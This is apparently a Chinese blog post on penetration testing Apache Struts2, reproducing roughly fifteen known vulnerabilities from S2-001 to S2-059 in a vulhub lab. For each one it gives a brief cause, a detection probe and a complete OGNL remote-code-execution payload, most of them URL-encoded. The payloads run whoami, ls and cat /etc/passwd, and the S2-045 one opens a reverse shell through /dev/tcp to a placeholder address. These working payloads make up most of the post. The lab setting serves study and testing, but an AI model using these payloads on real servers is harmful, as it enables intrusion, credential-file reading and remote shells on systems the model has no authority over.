# 原创
：  渗透测试--Struts2框架

# 渗透测试--Struts2框架

### 前言

Struts2是apache项目下的一个web 框架，普遍应用于阿里巴巴、京东等互联网、政府、企业门户网站。在我国strust2被广泛使用与各种战略性资产，Struts 2是Struts的下一代产品，但和一代相比架构有很大的区别，近年也是爆出了很多的高危漏洞，本文旨在帮助大家理解在渗透测试中strust2的测试手法以及基本原理

### Struts2简介

Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1的体系结构差别巨大。Struts 2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与ServletAPI完全脱离开，所以Struts 2可以理解为WebWork的更新产品。虽然从Struts 1到Struts 2有着非常大的变化，但是相对于WebWork，Struts 2的变化很小。<br/> 因为strust2基于MVC设计模式的Web应用框架，会对某些标签属性（比如 id）的属性值进行二次表达式解析，因此在某些场景下将可能导致远程代码执行。

### 环境搭建

Struts2至今已经迭代了很多版本，可在vulhub自行下载<br/> `https://github.com/vulhub/vulhub/tree/master/struts2`

#### 启动tomcat

`服务器（Windows）IP:192.168.126.1`<br/> `vulhub服务器（ubuntu）IP：192.168.126.128`<br/> `攻击机（kali）IP：192.168.126.130`<br/> 若未下载可在官网下载https://archive.apache.org/dist/tomcat/<br/> 启动Tomcat，访问本地8080端口<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/64431f6e3d8194141a8ee1e5d97f8e56.jpeg"/><br/> 此处举例S2-001搭建，将war包放入webapps，重启一下Tomcat即可自动部署<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/52f42acddcbd59af386886d2469f4b51.jpeg"/><br/> 进入Tomcat目录bin下，输入service.bat install<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/ef16d8e3835e390728b40993792d05f9.jpeg"/><br/> cmd输入services.msc，打开系统服务，可以找到apache Tomcat，不要启动，不然后续会报错，还要关掉进程。<br/> 用IDEA启动一个Tomcat服务器，网上都有教程大家自行寻找。<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/5486c5463f9526937ddc55c8b7dc7b4e.jpeg"/><br/> 虚拟机访问http://192.168.126.1:8088/Tomcat-web<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/50b76a5727fbfcceeb2baffd968d459c.jpeg"/>

#### S2-001

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/1410a1971347cf287cc9ed13af4d9f8c.jpeg"/><br/> 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行<br/> 这里在密码框输入`%{1+1}`，要进行URL编码为`%25%7B1%2B1%7D`，抓包。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/20d1cf6cd8aac7b95229316e46be6220.jpeg"/><br/> 1+1=2，合理。<br/> 现在直接命令执行，whoami

```
%{
#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),
#b=#a.getInputStream(),
#c=new java.io.InputStreamReader(#b),
#d=new java.io.BufferedReader(#c),
#e=new char[50000],
#d.read(#e),
#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
#f.getWriter().println(new java.lang.String(#e)),
#f.getWriter().flush(),#f.getWriter().close()
}

```

URL编码，发包<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/fec888dfb560c81cea1c0b58d454be14.jpeg"/>

#### S2-005

本地搭建过于麻烦，学会搭建一个就行，这里我们用vulhub来继续复现。vulhub搭建相信大家肯定都会。<br/> s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/b4d24ff834cc1733b21437f59b72c0e5.jpeg"/>

##### 执行任意文件写入：

`?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1`<br/> GET和POST方式都能把payload打过去<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/d9fb8fc7dfcd2e4cfe1fdd1de209d674.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a7aaefd4bea3764fbe9159eb659139ba.jpeg"/><br/> 成功创建

##### 命令执行：

用k8的工具：<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/ed69911b3a170f35ff2f3eb9bba4b546.jpeg"/><br/> wireshark抓取k8的payload如下：

```
('\43_memberAccess.allowStaticMethodAccess')(a)=true&amp;(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))=&amp;('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))=&amp;(g)(('\43mycmd\75\'whoami\'')(d))=&amp;(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))=&amp;(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))=&amp;(j)(('\43myres\75new\40byte[51020]')(d))=&amp;(k)(('\43mydat.readFully(\43myres)')(d))=&amp;(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))=&amp;(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))=&amp;(n)(('\43myout.getWriter().println(\43mystr)')(d))

```

#### S2-007

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/4ab63c30a66be259e6c43fe3e51e6890.jpeg"/><br/> age来自于用户输入，传递一个非整数给id导致错误，struts会将用户的输入当作ongl表达式执行，从而导致了漏洞<br/> 当-validation.xml配置的验证规则。如果类型验证转换失败，则服务器将拼接用户提交的表单值字符串，然后执行OGNL表达式解析并返回。

##### 验证

age输入`'+(1+1)+'`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/cc3e6abdc1f7cebbefff8c4670189998.jpeg"/><br/> 变成了11

##### 命令执行

`' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())) + '`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a597a355cf1d554a8d66b6f44b996e2e.jpeg"/><br/> whoami执行成功

#### S2-008

S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。还有就是 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，但这种情况再生产环境中几乎不可能存在。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/d7a664ccbc1f7352ec8ec3b3eda4b0ce.jpeg"/>

##### 命令执行

payload

```
/devmode.action?debug=command&amp;expression=(%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23foo%3dnew+java.lang.Boolean(%22false%22)+%2c%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3d%23foo%2c%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(%27whoami%27).getInputStream()))

```

#### S2-009

OGNL提供了广泛的表达式评估功能等功能，该漏洞允许恶意用户绕过ParametersInterceptor内置的所有保护（正则表达式，拒绝方法调用），从而能够将任何暴露的字符串变量中的恶意表达式注入进行进一步评估<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/32e5cf32854cd11f7c4c80ee416bdd30.jpeg"/>

##### 命令执行

执行ls

```
/ajax/example5.action?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27ls%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]

```

#### S2-012

如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/17fc3a015f8314722230f041162d58ad.jpeg"/>

##### 命令执行

cat /etc/passwd

```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat", "/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}

```

burpsuite中要进行URL编码<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/5fde45649076e7aecef9f943169e9243.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/15c5cbceb0d5b194082fddf1e3af9281.jpeg"/>

#### S2-013

s:url和s:a标记都提供includeparams属性。该属性的主要作用域是了解包含或不包含http://request参数的内容。INCLUDEParams的允许值为：none-在URL中不包含任何参数（默认），get-仅在URL中包含get参数，all-在URL中同时包含get和post参数。当INCLUDEParams被赋予了以上参数，struts会进行OGNL解析<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/9fe14566459e503cc196f2326ea55690.jpeg"/>

##### 检测

还是用${1+1}编码<br/> `link.action?a=%24%7B1%2B1%7D`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/77ccdd70f537aeca788e79c9adf52a65.jpeg"/><br/> 1+1=2，还是很合理。

##### 命令执行

cat /etc/passwd<br/> payload:

```
/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('cat /etc/passwd').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B 50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D

```

#### S2-015

如果请求与任何其他已定义的操作都不匹配，它将被*匹配，并且所请求的操作名称将用于基于操作名称加载JSP文件。并且{1}的值作为OGNL表达式受到威胁，因此允许在服务器端执行任意Java代码。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/c210e719c4ce353b38c73089b1df9514.jpeg"/>

##### 命令执行

whoami<br/> payload:

```
%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cat@/etc/passwd%27%29.getInputStream%28%29%29%2C%23q%7D.action

```

#### S2-016

在struts2中，DefaultActionMapper类支持以"action:"、“redirect:”、"redirectAction:"作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/5c1dee69c68ad3ef4944532120c05a86.jpeg"/>

##### 检测

用`${1+2}`，URL编码为`%24%7B1%2B2%7D`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/652a4d298dad841a00b21ee02748f81c.jpeg"/><br/> 1+2=3，再次合理

##### 命令执行

whoami

```
index.action?redirect:%24%7b%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2c%23f.setAccessible(true)%2c%23f.set(%23_memberAccess%2ctrue)%2c%23a%3d%40java.lang.Runtime%40getRuntime().exec(%22cat+etc/passwd%22).getInputStream()%2c%23b%3dnew+java.io.InputStreamReader(%23a)%2c%23c%3dnew+java.io.BufferedReader(%23b)%2c%23d%3dnew+char%500%5d%2c%23c.read(%23d)%2c%23genxor%3d%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2c%23genxor.println(%23d)%2c%23genxor.flush()%2c%23genxor.close()%7d

```

这里删掉了3个字符，违规了（┭┮﹏┭┮），师傅们看图<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/fe6b43d65fad53325287026fa9ad8184.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/efd0e6be3d5e7fa3d7ed980e0a69c33a.jpeg"/><br/> 下载文件，打开后里面是whoami的结果

#### S2-032

S2-032漏洞的影响范围是Struts 2.3.20 - Struts Struts 2.3.28，当开启了动态方法调用时可RCE。这次的漏洞分析以及后面的漏洞分析都是使用的Struts 2.3.24。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/c38115c4ce1a36edf9b4115081f5c4ab.jpeg"/>

##### 命令执行

whoami

```
index.action?method:%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse()%2c%23w%3d%23res.getWriter()%2c%23s%3dnew+java.util.Scanner(%40java.lang.Runtime%40getRuntime().exec(%23parameters.cmd%5b0%5d).getInputStream())%2c%23str%3d%23s.hasNext()%3f%23s.next()%3a%23xx%2c%23w.print(%23str)%2c%23w.close()%2c1%3f%23xx%3a%23request.toString&amp;cmd=whoami

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/fa2ae10dd56502e75bad76a892adaec5.jpeg"/><br/> 成功

#### S2-045

利用Struts2的上传功能代码里的非正常处理函数代码，没有正确的去处理访问客户输入的错误内容。导致黑客可以通过输入那里发送恶意的POST数据包，利用这个漏洞在windows 2003 2008 2012服务器跟Linux centos系统服务器上执行系统权限命令<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/d22647d254944e0f2217d58ca508429e.jpeg"/>

##### 检测

```
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',1+2+3+4)}.multipart/form-data

```

抓POST包修改Content-Type的值为上面代码<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/dfa39f3b1ad1f4275375c407cbee5de5.jpeg"/><br/> 1+2+3+4=10，非常合理

##### 命令执行

反弹shell:

```
%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}b

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/3929e958e6169e03fb650f1e042d668a.jpeg"/><br/> 反弹成功

#### S2-046

S2-046和S2-045的爆发点是一样的，只是输入点有些不同，利用方式上不一样<br/> 他有触发的条件，依次为：<br/> 1.上传文件的大小（由Content-Length头指定）大于Struts2默认允许的最大大小（2M）<br/> 2.header中的Content-Disposition中包含空字节<br/> 3.文件名内容构造恶意的OGNL内容<br/> 4.输入点在文件上传的filename值位置，并需要使用\x00截断

##### 检测

```
"%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',666666)}\x00b"

```

更改filename为上述代码，在hex里找到b之前一个符号，使用00截断，我们add了一个x-test=666666，若返回包里有则漏洞存在<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/8d77e2db73a911bc70b8cacb37327729.jpeg"/>

##### 命令执行

payload：

```
"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} b"

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/84ef287f4c3901c3e3085ce643b02e17.jpeg"/><br/> 我这里没有成功，不知道问题出在了哪里。

#### s2-048

漏洞成因是当ActionMessage接收客户可控的参数数据时，由于后续数据拼接传递后处理不当导致任意代码执行<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/2dba83bd66c5b0f72c99fb645f8b3cfe.jpeg"/>

##### 检测

访问/viewSource.action?config=fassName=com.open.jsp<br/> 名称填入${1+1}<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/406d4b9d5debab2507a1b6bd1d1bc429.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/8bb035e9cb167b3436b1ba8affb09e70.jpeg"/><br/> 1+1=2

##### 命令执行

whoami

```
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())).(#q)}

```

#### S2-053

Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/154d745c0045ebb4489d86ea8ccf79ee.jpeg"/>

##### 检测

`/hello?redirectUri=%25%7B666666-3%7D`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/8e81e6d1800c04f149169b3c372c5a4e.jpeg"/>

##### 命令执行

whoami:

```
/hello?redirectUri=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27whoami%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D%0D%0A

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/75a6d86ac1767df9d56e36b600017e5c.jpeg"/><br/> 成功执行

#### S2-057

S2-057漏洞产生于网站配置xml的时候，有一个namespace的值，该值并没有做详细的安全过滤导致可以写入到XML上，尤其url标签值也没有做通配符的过滤，导致可以执行远程代码，以及系统命令到服务器系统中去<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/21d9f2b8a9771c5f4c003c88316a90e6.jpeg"/><br/> 空的

##### 检测

`/struts2-showcase/$%7B1+2+3+4+5+6%7D/actionChain1.action`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/184520879ec54c193563d3874dab18c3.jpeg"/><br/> 1+2+3+4+5+6=21,很合理

##### 命令执行

whoami

```
/struts2-showcase/%24%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B%27struts.valueStack%27%5D.context).(%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27whoami%27)).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D/actionChain1.action

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/3f219be249df39b6397645fe46471d5d.jpeg"/><br/> 成功执行

#### S2-059

Apache Struts2使用某些标签时,会对标签属性值进行二次表达式解析,当标签属性值使用了%{skillName}并且skillName的值用户可以控制,就会造成OGNL表达式执行<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/ddef684dadf41c10cabe639ffa39df04.jpeg"/>

##### 检测

`?id=%25{3*3}`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/d7c7b4de583add048c3eda57410d59b0.jpeg"/><br/> 源码中被插入了9

##### 命令执行

payload:

```
%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('whoami'))}

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/944a830af2b0c73ff93048ec40fbfea8.jpeg"/><br/> 很奇怪，400，懂的老哥可以给我讲讲为什么不成功

### 总结

这次Struts2的学习，学到了环境的搭建，各种Struts2漏洞的检测方法RCE操作等等。之前只是知道Struts2漏洞这个东西，没想到有这么多的种类，这么多的攻击手法。希望师傅们都可以掌握Struts2的知识，共勉。
